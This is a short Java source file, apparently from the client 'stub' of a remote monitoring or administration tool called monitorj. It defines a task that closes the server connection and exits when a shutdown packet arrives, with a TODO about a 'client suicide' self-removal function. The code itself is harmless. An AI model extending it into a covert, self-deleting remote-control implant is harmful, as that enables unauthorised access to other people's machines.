package me.jershdervis.monitorj.stub.client.tasks;

import me.jershdervis.monitorj.stub.client.BaseClient;
import me.jershdervis.monitorj.stub.client.PacketTask;
import me.jershdervis.monitorj.stub.client.Packets;

import java.io.IOException;

/**
 * Created by Josh on 21/06/2015.
 */
public class ShutdownClientApplicationTask extends PacketTask {

    public ShutdownClientApplicationTask() {
        super(Packets.SHUTDOWN_CLIENT_APPLICATION.getPacketID());
    }

    @Override
    public void run(BaseClient client) throws IOException {
        client.getServerSocketConnection().close();
        //TODO: Add hottest newest client suicide function
        System.exit(0);
    }
}
